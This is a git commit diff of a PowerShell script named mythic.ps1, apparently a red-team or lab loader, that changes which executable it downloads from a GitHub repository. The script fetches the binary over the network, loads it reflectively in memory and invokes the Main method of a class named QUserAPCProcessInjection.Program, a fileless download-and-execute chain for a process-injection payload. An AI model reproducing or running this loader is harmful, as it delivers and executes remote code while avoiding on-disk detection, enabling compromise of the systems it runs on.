213fa538bb71ba72c851a667464003966f2aa77d
Amarjit Labhuram <amarjit.labhuram@gmail.com>
2023-07-26 23:33:28 +0300

    Update mythic.ps1

--- mythic.ps1
+++ mythic.ps1
@@ -1,4 +1,4 @@
-$bytes = (Invoke-WebRequest -useb "https://github.com/chr0n1k/AL2021/blob/main/labmythic.exe?raw=true").Content;
+$bytes = (Invoke-WebRequest -useb "https://github.com/chr0n1k/AL2021/blob/main/bic.exe?raw=true").Content;
 $assembly = [System.Reflection.Assembly]::Load($bytes);
 $entryPointMethod = $assembly.GetType('QUserAPCProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
 $entryPointMethod.Invoke($null, (, [string[]] ('', '')));
